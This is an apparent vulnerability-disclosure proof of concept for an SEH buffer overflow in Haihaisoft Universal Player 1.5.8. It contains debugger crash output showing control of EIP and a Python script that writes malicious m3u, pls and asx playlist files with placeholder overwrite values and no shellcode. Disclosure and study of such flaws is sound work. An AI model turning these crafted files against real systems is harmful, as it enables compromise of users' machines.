#-----------------------------------------------------------------------------#
# Exploit Title: Haihaisoft Universal Player 1.5.8 - Buffer Overflow (SEH)    #
# Date: Mar 25 2014                                                           #
# Exploit Author: Gabor Seljan                                                #
# Software Link: http://www.haihaisoft.com/hup.aspx                           #
# Version: 1.5.8.0                                                            #
# Tested on: Windows XP SP3                                                   #
#-----------------------------------------------------------------------------#

# (6ec.57c): Access violation - code c0000005 (first chance)
# First chance exceptions are reported before any exception handling.
# This exception may be expected and handled.
# eax=00000000 ebx=44444444 ecx=0000000f edx=00000000 esi=04bae7d0 edi=44444448
# eip=0069537f esp=04cb7b18 ebp=04cb7b58 iopl=0         nv up ei pl nz na pe nc
# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
# *** ERROR: Module load completed but symbols could not be loaded for mplayerc.exe
# mplayerc+0x29537f:
# 0069537f f3ab            rep stos dword ptr es:[edi]
# 0:005> g
# (6ec.57c): Access violation - code c0000005 (first chance)
# First chance exceptions are reported before any exception handling.
# This exception may be expected and handled.
# eax=00000000 ebx=00000000 ecx=43434343 edx=7c9032bc esi=00000000 edi=00000000
# eip=43434343 esp=04cb7748 ebp=04cb7768 iopl=0         nv up ei pl zr na pe nc
# cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
# 43434343 ??              ???
# 0:005> !exchain
# 04cb775c: ntdll!RtlConvertUlongToLargeInteger+7e (7c9032bc)
# 04cb7b4c: mplayerc+2e2e78 (006e2e78)
# 04cb8b80: 43434343
# Invalid exception stack at 42424242

#!/usr/bin/python

junk1  = "\x80" * 50;
offset = "\x41" * 1591;
nSEH   = "\x42" * 4;
SEH    = "\x43" * 4;
junk2  = "\x44" * 5000;

evil = "http://{junk1}{offset}{nSEH}{SEH}{junk2}".format(**locals())

for e in ['m3u', 'pls', 'asx']:
  if e is 'm3u':
    poc = evil
  elif e is 'pls':
    poc = "[playlist]\nFile1={}".format(evil)
  else:
    poc = "<asx version=\"3.0\"><entry><ref href=\"{}\"/></entry></asx>".format(evil)
  try:
    print("[*] Creating poc.%s file..." % e)
    f = open('poc.%s' % e, 'w')
    f.write(poc)
    f.close()
    print("[*] %s file successfully created!" % f.name)
  except:
    print("[!] Error while creating exploit file!")